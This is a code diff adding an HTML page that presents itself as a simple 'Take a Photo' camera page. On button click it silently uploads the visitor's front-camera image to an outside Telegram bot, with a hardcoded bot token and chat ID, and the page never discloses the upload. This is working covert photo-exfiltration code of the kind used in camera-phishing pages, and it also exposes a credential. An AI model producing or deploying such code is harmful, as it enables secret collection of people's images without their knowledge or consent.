@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Front Camera Photo</title>
+</head>
+<body>
+    <h1>Take a Photo</h1>
+    <video id="video" width="320" height="240" autoplay></video>
+    <button id="snap">Capture Photo</button>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script>
+        // Access user's front camera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: " + err);
+            });
+
+        // Capture photo
+        document.getElementById("snap").addEventListener("click", () => {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to data URL
+            const dataURL = canvas.toDataURL('image/png');
+
+            // Send the image to the Telegram bot
+            sendPhotoToTelegramBot(dataURL);
+        });
+
+        // Function to send photo to Telegram bot
+        function sendPhotoToTelegramBot(photoData) {
+            const botToken = "7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y";
+            const chatId = "6471397661";
+            const formData = new FormData();
+            formData.append("photo", dataURLtoBlob(photoData));
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(err => console.error(err));
+        }
+
+        // Convert Data URL to Blob
+        function dataURLtoBlob(dataURL) {
+            const parts = dataURL.split(',');
+            const byteString = atob(parts[1]);
+            const mimeString = parts[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
